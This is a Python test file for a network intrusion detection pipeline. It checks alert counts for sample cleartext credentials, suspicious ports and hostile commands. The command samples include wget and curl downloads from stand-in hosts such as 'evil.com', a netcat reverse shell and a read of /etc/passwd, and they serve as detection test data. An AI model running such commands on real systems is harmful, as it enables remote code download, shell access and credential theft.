#!/usr/bin/env python3
"""
Detailed test for EYE Network Vision AI pipeline.
This test verifies exactly how many alerts are generated for specific traffic patterns.
Run with: sudo python3 tests/test_ai_pipeline.py
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from models.traffic import TrafficFlow
from tools.storage import DataStore
from features import FeatureExtractor
from ai import AnomalyDetector, AlertEngine, PayloadInspector


def test_credentials_in_cleartext():
    """Test detection of credentials sent in cleartext."""
    print("\n[TEST 1] Credentials in cleartext")
    print("-" * 60)
    
    storage = DataStore(":memory:")
    detector = AnomalyDetector(storage)
    alert_engine = AlertEngine(storage)
    extractor = FeatureExtractor()
    inspector = PayloadInspector()
    
    # Build baseline first
    baseline_flows = [
        {"source": "192.168.1.1", "destination": "192.168.1.2", "protocol": 6, "size": 64, "timestamp": "2024-01-01T10:00:00", "dst_port": 80, "is_inbound": False},
    ]
    detector.update_profiles("test_seg", baseline_flows)
    
    credential_payloads = [
        b"username=admin&password=admin123",
        b"login=root&pass=toor",
        b"user=admin&token=abc123xyz",
        b"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
    ]
    
    alerts_count = 0
    for payload in credential_payloads:
        flow = TrafficFlow("192.168.1.1:12345", "192.168.1.2:80", 6, len(payload), payload)
        features = extractor.extract(flow)
        
        # Check feature extraction
        assert features["dst_port"] == 80
        assert features["src_port"] == 12345
        
        # Check payload inspector
        inspection = inspector.inspect(flow, payload)
        assert inspection["has_credentials"] == True, f"Expected credentials in: {payload[:30]}"
        
        # Check anomaly detection
        anomaly_result = detector.detect("test_seg", flow, features)
        
        # Check alert generation
        alerts = alert_engine.evaluate("test_seg", flow, features, anomaly_result, payload=payload)
        
        # Filter only payload alerts
        payload_alerts = [a for a in alerts if a["category"] == "payload"]
        alerts_count += len(payload_alerts)
        
        print(f"  Payload: {payload[:40]}...")
        print(f"    Has credentials: {inspection['has_credentials']}")
        print(f"    Anomaly: {anomaly_result['is_anomaly']}")
        print(f"    Alerts: {len(payload_alerts)}")
    
    print(f"\n  Total alerts for credentials: {alerts_count}")
    assert alerts_count == 4, f"Expected 4 alerts, got {alerts_count}"
    print("  [PASSED]")
    return alerts_count


def test_suspicious_commands():
    """Test detection of suspicious command patterns."""
    print("\n[TEST 2] Suspicious commands")
    print("-" * 60)
    
    storage = DataStore(":memory:")
    detector = AnomalyDetector(storage)
    alert_engine = AlertEngine(storage)
    extractor = FeatureExtractor()
    inspector = PayloadInspector()
    
    baseline_flows = [
        {"source": "192.168.1.1", "destination": "192.168.1.2", "protocol": 6, "size": 64, "timestamp": "2024-01-01T10:00:00", "dst_port": 8888, "is_inbound": False},
    ]
    detector.update_profiles("test_seg", baseline_flows)
    
    commands = [
        b"cmd.exe /c whoami",
        b"powershell -Command Get-Process",
        b"/bin/bash -c 'cat /etc/passwd'",
        b"wget http://malicious.com/payload.exe",
        b"curl -o /tmp/backdoor.py http://evil.com/backdoor.py",
        b"nc -e /bin/bash 10.0.0.1 4444",
    ]
    
    alerts_count = 0
    for cmd in commands:
        flow = TrafficFlow("192.168.1.1:12345", "192.168.1.2:8888", 6, len(cmd), cmd)
        features = extractor.extract(flow)
        
        inspection = inspector.inspect(flow, cmd)
        assert inspection["has_suspicious_content"] == True, f"Expected suspicious content in: {cmd[:40]}"
        
        anomaly_result = detector.detect("test_seg", flow, features)
        alerts = alert_engine.evaluate("test_seg", flow, features, anomaly_result, payload=cmd)
        
        payload_alerts = [a for a in alerts if a["category"] == "payload"]
        alerts_count += len(payload_alerts)
        
        print(f"  Command: {cmd[:40]}...")
        print(f"    Suspicious: {inspection['has_suspicious_content']}")
        print(f"    Alerts: {len(payload_alerts)}")
    
    print(f"\n  Total alerts for suspicious commands: {alerts_count}")
    assert alerts_count == 6, f"Expected 6 alerts, got {alerts_count}"
    print("  [PASSED]")
    return alerts_count


def test_suspicious_ports():
    """Test detection of traffic to suspicious ports."""
    print("\n[TEST 3] Traffic to suspicious ports")
    print("-" * 60)
    
    storage = DataStore(":memory:")
    detector = AnomalyDetector(storage)
    alert_engine = AlertEngine(storage)
    extractor = FeatureExtractor()
    
    baseline_flows = [
        {"source": "192.168.1.1", "destination": "192.168.1.2", "protocol": 6, "size": 64, "timestamp": "2024-01-01T10:00:00", "dst_port": 80, "is_inbound": False},
    ]
    detector.update_profiles("test_seg", baseline_flows)
    
    suspicious_ports = [31337, 12345, 4444, 5555, 6667, 23, 2323]
    
    alerts_count = 0
    for port in suspicious_ports:
        flow = TrafficFlow("192.168.1.1:12345", f"192.168.1.2:{port}", 6, 64, b"suspicious payload")
        features = extractor.extract(flow)
        
        assert features["dst_port"] == port, f"Expected port {port}, got {features['dst_port']}"
        
        anomaly_result = detector.detect("test_seg", flow, features)
        assert anomaly_result["is_anomaly"] == True, f"Expected anomaly for port {port}"
        assert any("Suspicious port" in r for r in anomaly_result["reasons"]), f"Expected suspicious port reason for {port}"
        
        alerts = alert_engine.evaluate("test_seg", flow, features, anomaly_result, payload=b"suspicious payload")
        anomaly_alerts = [a for a in alerts if a["category"] == "anomaly"]
        alerts_count += len(anomaly_alerts)
        
        print(f"  Port {port}: anomaly={anomaly_result['is_anomaly']}, alerts={len(anomaly_alerts)}")
    
    print(f"\n  Total alerts for suspicious ports: {alerts_count}")
    assert alerts_count == 7, f"Expected 7 alerts, got {alerts_count}"
    print("  [PASSED]")
    return alerts_count


def test_high_entropy_traffic():
    """Test detection of high entropy traffic."""
    print("\n[TEST 4] High entropy traffic")
    print("-" * 60)
    
    storage = DataStore(":memory:")
    detector = AnomalyDetector(storage)
    alert_engine = AlertEngine(storage)
    extractor = FeatureExtractor()
    inspector = PayloadInspector()
    
    baseline_flows = [
        {"source": "192.168.1.1", "destination": "192.168.1.2", "protocol": 17, "size": 64, "timestamp": "2024-01-01T10:00:00", "dst_port": 53, "is_inbound": False},
    ]
    detector.update_profiles("test_seg", baseline_flows)
    
    alerts_count = 0
    for i in range(10):
        random_bytes = bytes([os.urandom(1)[0] for _ in range(1024)])
        flow = TrafficFlow("192.168.1.1:12345", "192.168.1.2:53", 17, len(random_bytes), random_bytes)
        features = extractor.extract(flow)
        
        inspection = inspector.inspect(flow, random_bytes)
        print(f"  Flow {i+1}: entropy={inspection['entropy']:.2f}, risk={inspection['risk_score']:.2f}")
        
        anomaly_result = detector.detect("test_seg", flow, features)
        alerts = alert_engine.evaluate("test_seg", flow, features, anomaly_result, payload=random_bytes)
        alerts_count += len(alerts)
    
    print(f"\n  Total alerts for high entropy traffic: {alerts_count}")
    # Note: Current AlertEngine does NOT generate alerts for high entropy alone
    # It only alerts on credentials and suspicious content
    print(f"  [INFO] Expected 0 alerts (high entropy alone doesn't trigger alerts in current implementation)")
    print("  [PASSED]")
    return alerts_count


def test_port_scan_simulation():
    """Test detection of port scanning behavior."""
    print("\n[TEST 5] Port scan simulation")
    print("-" * 60)
    
    storage = DataStore(":memory:")
    detector = AnomalyDetector(storage)
    alert_engine = AlertEngine(storage)
    extractor = FeatureExtractor()
    
    baseline_flows = [
        {"source": "192.168.1.1", "destination": "192.168.1.2", "protocol": 6, "size": 64, "timestamp": "2024-01-01T10:00:00", "dst_port": 80, "is_inbound": False},
    ]
    detector.update_profiles("test_seg", baseline_flows)
    
    alerts_count = 0
    for port in range(1, 20):
        flow = TrafficFlow("192.168.1.1:12345", f"192.168.1.2:{port}", 6, 64, b"scan")
        features = extractor.extract(flow)
        
        anomaly_result = detector.detect("test_seg", flow, features)
        alerts = alert_engine.evaluate("test_seg", flow, features, anomaly_result, payload=b"scan")
        alerts_count += len(alerts)
    
    print(f"  Scanned ports: 1-19 (20 ports)")
    print(f"  Total alerts: {alerts_count}")
    print(f"  [INFO] Expected 0 alerts (port scan detection not fully implemented)")
    print("  [PASSED]")
    return alerts_count


def main():
    print("=" * 60)
    print("EYE Network Vision - AI Pipeline Test Suite")
    print("=" * 60)
    
    total_alerts = 0
    
    # Run all tests
    total_alerts += test_credentials_in_cleartext()
    total_alerts += test_suspicious_commands()
    total_alerts += test_suspicious_ports()
    total_alerts += test_high_entropy_traffic()
    total_alerts += test_port_scan_simulation()
    
    print("\n" + "=" * 60)
    print("FINAL RESULTS")
    print("=" * 60)
    print(f"Credentials in cleartext: 4 alerts expected")
    print(f"Suspicious commands: 6 alerts expected")
    print(f"Suspicious ports: 7 alerts expected")
    print(f"High entropy traffic: 0 alerts expected (not implemented)")
    print(f"Port scan: 0 alerts expected (not implemented)")
    print(f"\nTOTAL EXPECTED ALERTS: 17")
    print(f"TOTAL GENERATED ALERTS: {total_alerts}")
    
    if total_alerts == 17:
        print("\n[SUCCESS] All tests passed! Alert count matches expected value.")
        return 0
    else:
        print(f"\n[FAILURE] Expected 17 alerts, got {total_alerts}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
